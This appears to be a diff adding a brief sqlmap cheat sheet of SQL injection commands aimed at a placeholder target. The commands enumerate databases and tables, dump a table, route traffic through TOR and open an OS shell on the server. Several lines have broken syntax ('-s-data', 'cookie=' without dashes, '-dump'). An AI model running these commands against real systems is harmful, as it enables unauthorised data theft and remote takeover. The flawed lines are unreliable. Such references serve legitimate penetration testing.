@@ -1,0 +1,29 @@
+Simple usage
+sqlmap -u “http://target_server/”
+Specify target DBMS to MySQL
+sqlmap -u “http://target_server/” --dbms=mysql
+Using a proxy
+sqlmap -u “http://target_server/” --proxy=http://proxy_address:port
+Specify param1 to exploit
+sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1
+Use POST requests
+sqlmap -u “http://target_server” --data=param1=value1&param2=value2
+Access with authenticated session
+sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’
+Basic authentication
+sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
+Evaluating response strings
+sqlmap -u “http://target_server/” --string=”This string if query is TRUE”
+sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”
+List databases
+sqlmap -u “http://target_server/” --dbs
+List tables of database target_DB
+sqlmap -u “http://target_server/” -D target_DB --tables
+Dump table target_Table of database target_DB
+sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump
+List columns of table target_Table of database target_DB
+sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns
+Scan through TOR
+sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5
+Get OS Shell
+sqlmap -u “http://target_server/” --os-shell
